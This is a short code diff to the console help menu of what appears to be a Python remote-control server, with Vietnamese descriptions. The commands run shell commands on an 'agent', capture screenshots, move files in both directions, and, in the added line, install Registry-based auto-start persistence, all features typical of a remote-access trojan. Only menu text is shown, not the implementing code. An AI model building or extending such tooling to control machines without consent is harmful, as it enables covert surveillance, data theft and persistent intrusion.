@@ -107,8 +107,9 @@ def console_thread():
     print("Syntax:")
     print("  set <id> <cmd>              : Chạy lệnh CMD")
     print("  set <id> screenshot         : Chụp màn hình")
-    print("  set <id> download <remote>  : Tải file từ Agent về Server")
-    print("  upload <id> <local> <remote>: Đẩy file từ Server xuống Agent")
+    print("  set <id> download <remote>  : Tải file về")
+    print("  upload <id> <local> <remote>: Đẩy file lên")
+    print("  set <id> persistence        : Cài đặt tự khởi động (Registry)") 
     
     while True:
         try:
